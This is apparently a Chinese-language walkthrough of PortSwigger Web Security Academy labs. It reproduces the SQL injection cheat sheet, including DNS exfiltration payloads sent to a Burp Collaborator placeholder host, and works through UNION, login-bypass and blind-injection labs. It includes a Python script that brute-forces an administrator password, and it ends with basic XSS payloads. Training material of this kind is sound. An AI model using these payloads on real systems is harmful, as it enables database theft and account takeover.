```http
https://blog.csdn.net/qq_53079406/category_12153445.html
```

# SQL injection cheat sheet

This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## String concatenation

You can concatenate together multiple strings to make a single string.

| Oracle     | `'foo'||'bar'`                                               |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `'foo'+'bar'`                                                |
| PostgreSQL | `'foo'||'bar'`                                               |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')` |

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| :--------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

| Oracle     | `--comment`                                                  |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `--comment/*comment*/`                                       |
| PostgreSQL | `--comment/*comment*/`                                       |
| MySQL      | `#comment` `-- comment` [Note the space after the double dash] `/*comment*/` |

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

| Oracle     | `SELECT banner FROM v$versionSELECT version FROM v$instance` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT @@version`                                           |
| PostgreSQL | `SELECT version()`                                           |
| MySQL      | `SELECT @@version`                                           |

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

| Oracle     | `SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL      | `SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## Extracting data via visible error messages

You can potentially elicit error messages that leak sensitive data returned by your malicious query.

| Microsoft  | `SELECT 'foo' WHERE 1 = (SELECT 'secret')> Conversion failed when converting the varchar value 'secret' to data type int.` |
| :--------- | ------------------------------------------------------------ |
| PostgreSQL | `SELECT CAST((SELECT password FROM users LIMIT 1) AS int)> invalid input syntax for integer: "secret"` |
| MySQL      | `SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))> XPATH syntax error: '\secret'` |

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

| Oracle     | `Does not support batched queries.` |
| :--------- | ----------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| :--------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT SLEEP(10)`                    |

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`            |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`               |

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

| Oracle     | The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`  The following technique works on fully patched Oracle installations, but requires elevated privileges: `SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`  |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'` |
| MySQL      | The following techniques work on Windows only: `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')` `SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

| Oracle     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual` |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')` |
| PostgreSQL | `create OR replace function f() returns void as $$declare c text;declare p text;beginSELECT into p (SELECT YOUR-QUERY-HERE);c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';execute c;END;$$ language plpgsql security definer;SELECT f();` |
| MySQL      | The following technique works on Windows only: `SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'` |

# SQL injection

## 一、隐藏商品

Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform a SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

### 分析

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

```
示例：
一个显示不同类别产品的购物应用程序。当用户单击“礼品”类别时，其浏览器会请求 URL：
https://insecure-website.com/products?category=Gifts
 
SQL查询，以从数据库中检索相关产品的详细信息：
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 
此 SQL 查询要求数据库返回：
所有详细信息 （*）
从产品表
其中类别为礼品
并释放是 1
 
该限制用于隐藏未发布的产品。对于未发布的产品，大概为released = 1 released = 0
```

### 步骤

当我们访问

```http
https://0a5d007503c5bf1581290ca80050004e.web-security-academy.net/filter?category=Accessories
```

出现以下商品

<img src=".\图片\Snipaste_2023-06-01_14-28-14.png" alt="Snipaste_2023-06-01_14-28-14" style="zoom:80%;" />

当我们访问

```http
https://0a5d007503c5bf1581290ca80050004e.web-security-academy.net/filter?category=Accessories'-- 
```

多出了商品

<img src=".\图片\Snipaste_2023-06-01_14-30-39.png" alt="Snipaste_2023-06-01_14-30-39" style="zoom:80%;" />



当我们访问

```http
https://0a5d007503c5bf1581290ca80050004e.web-security-academy.net/filter?category=Accessories'or 1=1-- 
```

显示了全部商品

<img src=".\图片\Snipaste_2023-06-01_14-31-59.png" alt="Snipaste_2023-06-01_14-31-59" style="zoom:80%;" />

这时执行拼接的sql语句如下：

```sql
SELECT * FROM products WHERE category = 'Accessories'or 1=1-- ' AND released = 1
```

```
' AND released = 1  被注释了
```

## 二、颠覆应用程序逻辑

Lab: SQL injection vulnerability allowing login bypass

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

<img src=".\图片\Snipaste_2023-06-01_14-47-10.png" alt="Snipaste_2023-06-01_14-47-10" style="zoom:80%;" />

官方解：

```
administrator'--
```

## 检索数据

### 三、判断列

Lab: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing null values.

#### 步骤

```http
https://0a7e00b604f6f09e800d12aa0056002e.web-security-academy.net/filter?category=Lifestyle' order by 3-- 
//正常返回
```

```http
https://0a7e00b604f6f09e800d12aa0056002e.web-security-academy.net/filter?category=Lifestyle' order by 4-- 
//报错
```

```http
https://0a7e00b604f6f09e800d12aa0056002e.web-security-academy.net/filter?category=Lifestyle' union select database(),null,null-- 
//过关
```

#### 官方解

1. Use Burp Suite to intercept and modify the request that sets the product category filter.

2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.

3. Modify the `category` parameter to add an additional column containing a null value:

   ```
   '+UNION+SELECT+NULL,NULL--
   ```

4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

### 四、判断字段对应位置

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

#### 步骤

```http
https://0a0700ca04d08408807c80ec0028003b.web-security-academy.net/filter?category=Lifestyle' union select null,'SBbxY3',null-- 
```

#### 官方解

1. Use Burp Suite to intercept and modify the request that sets the product category filter.

2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter:

   ```
   '+UNION+SELECT+NULL,NULL,NULL--
   ```

3. Try replacing each null with the random value provided by the lab, for example:

   ```
   '+UNION+SELECT+'abcdef',NULL,NULL--
   ```

4. If an error occurs, move on to the next null and try that instead.

### 五、其它表检索数据

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### 步骤

```http
https://0aea0010043eb910800558bf005000e2.web-security-academy.net/filter?category=Lifestyle00000' UNIOn SELECT username,password FROM users-- 
```

<img src=".\图片\Snipaste_2023-06-01_15-35-29.png" alt="Snipaste_2023-06-01_15-35-29" style="zoom:80%;" />

再登录即可

```
administrator:s49vr3hw8wixowazj6vj
```

### 六、单个列中检索多个字段

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

#### 步骤

1、判断表中字段的类型，且判断回显的位置

<img src=".\图片\Snipaste_2023-06-03_11-47-35.png" alt="Snipaste_2023-06-03_11-47-35" style="zoom:67%;" />

<img src=".\图片\Snipaste_2023-06-03_11-51-15.png" alt="Snipaste_2023-06-03_11-51-15" style="zoom:67%;" />

发现第一位是数字型，第二位为字符型，且回显在第二位

2、String concatenation

You can concatenate together multiple strings to make a single string.（不同数据库字符串的连接方法）

| Oracle     | `'foo'||'bar'`                                               |
| :--------- | ------------------------------------------------------------ |
| Microsoft  | `'foo'+'bar'`                                                |
| PostgreSQL | `'foo'||'bar'`                                               |
| MySQL      | `'foo' 'bar'` [Note the space between the two strings] `CONCAT('foo','bar')` |

测试：

```http
https://0a7d006c044a298a836de9ad004a004a.web-security-academy.net/filter?category=Gifts' union select '1',username||password  from users-- 
```

<img src=".\图片\Snipaste_2023-06-03_11-56-40.png" alt="Snipaste_2023-06-03_11-56-40" style="zoom:67%;" />

3、登录

```
administrator:5xfk5dhoux2bficq7xoi
```

#### 官方解

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

### 七、Oracle数据库版本

Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

#### 步骤

查询需要带上表（dual表，此表是Oracle数据库中的一个自带表）

<img src=".\图片\Snipaste_2023-06-03_12-16-17.png" alt="Snipaste_2023-06-03_12-16-17" style="zoom:67%;" />

```
扩展（各数据库查询版本语句）：
Mysql        SELECT version()
Sql Server   SELECT @@version
Oracle       SELECT * FROM v$version
Postgre      SELECT version()
```

答案：

```http
https://0a7300110374e68d802d087700e1002c.web-security-academy.net/filter?category=Accessories111'  union select banner,'2' from v$version -- 
```

<img src=".\图片\Snipaste_2023-06-03_12-18-52.png" alt="Snipaste_2023-06-03_12-18-52" style="zoom:80%;" />

#### 官方解

1. Use Burp Suite to intercept and modify the request that sets the product category filter.

2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

   ```
   '+UNION+SELECT+'abc','def'+FROM+dual--
   ```

3. Use the following payload to display the database version:

   ```
   '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
   ```

### 八、Mysql数据库版本

Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

#### 步骤

```http
https://0a7100e3047e5a408030037a002900d7.web-security-academy.net/filter?category=Giftsaa' union select version(),@@version--+
```

<img src=".\图片\Snipaste_2023-06-03_12-30-05.png" alt="Snipaste_2023-06-03_12-30-05" style="zoom:67%;" />

补充：

```
(此处-- a是为了使空格不被插件忽略，使得注释成功)
————
part2:
'union+select+null,version()-- a
```

#### 官方解

1. Use Burp Suite to intercept and modify the request that sets the product category filter.

2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:

   ```
   '+UNION+SELECT+'abc','def'#
   ```

3. Use the following payload to display the database version:

   ```
   '+UNION+SELECT+@@version,+NULL#
   ```

### 九、Orange数据库检索1

Lab: SQL injection attack, listing the database contents on non-Oracle databases

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

#### 步骤

information_schema 库的知识

```http
https://0a27003203dbd5e480cba3be000800a0.web-security-academy.net/filter?category=Pets' union select table_name,'1' FROM information_schema.tables --+
```

```http
https://0a27003203dbd5e480cba3be000800a0.web-security-academy.net/filter?category=Pets' union select '1',column_name from information_schema.columns WHERE table_name = 'users_gqcgxs'--+
```

```http
https://0a27003203dbd5e480cba3be000800a0.web-security-academy.net/filter?category=Pets' union select username_dssnax,password_clspga FROM users_gqcgxs--+ 
```

登录：

```
administrator:ow4q7ugyw9qa83axrsjh
```

### 实验10：Orange数据库检索2

Lab: SQL injection attack, listing the database contents on Oracle

This lab contains a [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

心得：Orange特殊之FROM dual

#### 步骤

与之前 mysql 的 information_schema 表查询过程类似

1、判断当前表字段数

```http
https://0a76009b0309dae38154259000000094.web-security-academy.net/filter?category=Accessories' order by 2-- 
```

2、使用自带的 dual 表判断回显位置，为  '1'  '2'

```http
https://0a76009b0309dae38154259000000094.web-security-academy.net/filter?category=Accessories' union select '1','2' from dual-- 
```

3、列出所有表，找到敏感的用户表的表名为 `USERS_HHMPZK`

```http
https://0a76009b0309dae38154259000000094.web-security-academy.net/filter?category=Accessories' union select table_name,null from all_tables-- 
```

4、查表中的字段，为 `PASSWORD_BZDJLO` 和 `USERNAME_COHFTB`

```http
https://0a76009b0309dae38154259000000094.web-security-academy.net/filter?category=Accessories' union select column_name,null from all_tab_columns where table_name='USERS_HHMPZK'-- 
```

5、查数据

```http
https://0a76009b0309dae38154259000000094.web-security-academy.net/filter?category=Accessories' union select USERNAME_COHFTB,PASSWORD_BZDJLO from USERS_HHMPZK -- 
```

administrator:xgev8moier1o9yjnmntq

6、登录

<img src=".\图片\Snipaste_2023-06-16_19-25-09.png" alt="Snipaste_2023-06-16_19-25-09" style="zoom:80%;" />

### 实验11：带条件响应的SQL注入

Lab: Blind SQL injection with conditional responses

This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

#### 步骤

1、注入点在Cookie里，判断注入 `' and '1'='1` 时发现返回有 `Welcome back` 的字符，而 `' and '1'='2` 时则没有

```http
TrackingId=tdN8wN7evQTVfo4x'%20and%20'1'%3d'1;
```

<img src=".\图片\Snipaste_2023-06-16_19-40-01.png" alt="Snipaste_2023-06-16_19-40-01" style="zoom:80%;" />

2、测试盲注

发现存在  `information_schema.tables` 表

```http
TrackingId=tdN8wN7evQTVfo4x'%20AND%20(SELECT%20'a'%20FROM%20information_schema.tables%20LIMIT%201)%3d'a'--
```

发现存在 users 表

```
' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

猜测表的字段为 username 和 password ，发现存在 administrator 用户

```
' AND (SELECT 'a' FROM users WHERE username='administrator')='a'--
```

python脚本布尔盲注

```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

```python
import requests
import string

url = "https://0a6700c004f35a9f802d71d500bc005d.web-security-academy.net/"

def getlength():
   for len in range(1, 99):
     exp = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{len})='a'-- "
     headers = {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
         'Cookie': f'TrackingId=9POirhityuQuZTlU{exp}'
     }
     # print(headers)
     r = requests.get(url,headers=headers)
     if "Welcome back" in r.text:
         print(len)  # 显示 19 ，就代表有 20 位
     else:
         break

def getdata():
    data = ''
    flag = string.ascii_lowercase + string.digits
    for i in range(1, 21):   #注意这里的右边界该为 上个函数里的 位数加 1
        for j in flag:
            exp = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{j}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
                'Cookie': f'TrackingId=9POirhityuQuZTlU{exp}'
            }
            r = requests.get(url,headers=headers)
            if "Welcome back" in r.text:
                data += j
                print(data)

if __name__ == '__main__':
    # getlength()
    getdata()
```

```
mwaepvq49x0h8q6kk3h3
```

#### 官方解

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the `TrackingId` cookie. For simplicity, let's say the original value of the cookie is `TrackingId=xyz`.

2. Modify the `TrackingId` cookie, changing it to:

   ```
   TrackingId=xyz' AND '1'='1
   ```

   Verify that the "Welcome back" message appears in the response.

3. Now change it to:

   ```
   TrackingId=xyz' AND '1'='2
   ```

   Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

4. Now change it to:

   ```
   TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
   ```

   Verify that the condition is true, confirming that there is a table called `users`.

5. Now change it to:

   ```
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
   ```

   Verify that the condition is true, confirming that there is a user called `administrator`.

6. The next step is to determine how many characters are in the password of the `administrator` user. To do this, change the value to:

   ```
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
   ```

   This condition should be true, confirming that the password is greater than 1 character in length.

7. Send a series of follow-up values to test different password lengths. Send:

   ```
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
   ```

   Then send:

   ```
   TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
   ```

   And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.

8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.

9. In the Positions tab of Burp Intruder, change the value of the cookie to:

   ```
   TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
   ```

   This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

10. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

    ```
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
    ```

11. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under **Payload settings** add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

12. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the **Settings** tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".

13. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.

14. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.

15. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

    ```
    TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
    ```

16. Launch the modified attack, review the results, and note the character at the second offset.

17. Continue this process testing offset 3, 4, and so on, until you have the whole password.

18. In the browser, click "My account" to open the login page. Use the password to log in as the `administrator` user.

# Cross-site scripting

[Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

## Lab1

Lab: Reflected XSS into HTML context with nothing encoded

This lab contains a simple [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search functionality.

To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

```
将XSS反射到HTML上下文中，不进行任何编码

信息：

本实验包含搜索功能中的一个简单反映的跨站点脚本漏洞。

完成实验：执行调用alert函数的跨站点脚本攻击。
```

### 步骤

用户输入与数据回显

<img src=".\图片\Snipaste_2023-06-18_15-01-04.png" alt="Snipaste_2023-06-18_15-01-04" style="zoom:67%;" />

弹一个框

```html
<script>alert(1)</script>
```

<img src=".\图片\Snipaste_2023-06-18_15-02-29.png" alt="Snipaste_2023-06-18_15-02-29" style="zoom:67%;" />

审查元素，可以发现用户输入在源码里显示为：

<img src=".\图片\Snipaste_2023-06-18_15-05-38.png" alt="Snipaste_2023-06-18_15-05-38" style="zoom:80%;" />

## Lab2

Lab: Stored XSS into HTML context with nothing encoded

This lab contains a [stored cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

```
实验2：将XSS存储到HTML上下文中，不进行任何编码
信息：

本实验的评论功能中存在一个已存储的跨站点脚本漏洞。

要完成此实验，请提交一条评论，以便在查看博客帖子时调用alert函数
```

### 步骤

功能点为留言板，这里为储存型 XSS

<img src=".\图片\Snipaste_2023-06-18_15-12-23.png" alt="Snipaste_2023-06-18_15-12-23" style="zoom:67%;" />

在 Comment 输入框里插入 `<script>alert(1)</script>` ，即可弹框

审查元素发现：

<img src=".\图片\Snipaste_2023-06-18_15-14-27.png" alt="Snipaste_2023-06-18_15-14-27" style="zoom: 80%;" />

## Lab3

Lab: DOM XSS in `document.write` sink using source `location.search`

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

```
实验3：DOM XSS输入 document.write 汇使用源 location.search
信息：

本实验在搜索查询跟踪功能中包含一个基于DOM的跨站点脚本漏洞。它使用JavaScript document.write函数，该函数将数据写入页面。document.write函数是使用www.example.com中的数据调用location.search，可以使用网站URL来控制这些数据

要完成本实验，请执行调用警报函数的跨站点脚本攻击。
```

### 步骤

发现用户输入的 `test2` 在 image 的 src 标签里

<img src=".\图片\Snipaste_2023-06-18_15-26-14.png" alt="Snipaste_2023-06-18_15-26-14" style="zoom:80%;" />

于是尝试闭合标签，输入

```
"><svg onload=alert(1)>
```

发现拼接到源码里如下：

<img src=".\图片\Snipaste_2023-06-18_15-28-44.png" alt="Snipaste_2023-06-18_15-28-44" style="zoom:80%;" />

## Lab4

Lab: DOM XSS in `innerHTML` sink using source `location.search`

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

```
实验4：DOM XSS输入 innerHTML 汇使用源 location.search
信息：

本实验在搜索博客功能中包含一个基于DOM的跨站点脚本漏洞。使用一个innerHTML赋值，该赋值使用location.search中的数据更改div元素的HTML内容。

完成实验：执行调用alert函数的跨站点脚本攻击。
```



### 步骤

输入  `<img src=1 onerror=alert(1)>`

拼接后源码如下：

<img src=".\图片\Snipaste_2023-06-18_15-35-03.png" alt="Snipaste_2023-06-18_15-35-03" style="zoom:80%;" />



The value of the `src` attribute is invalid and throws an error. This triggers the `onerror` event handler, which then calls the `alert()` function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.

## Lab5

Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.

```
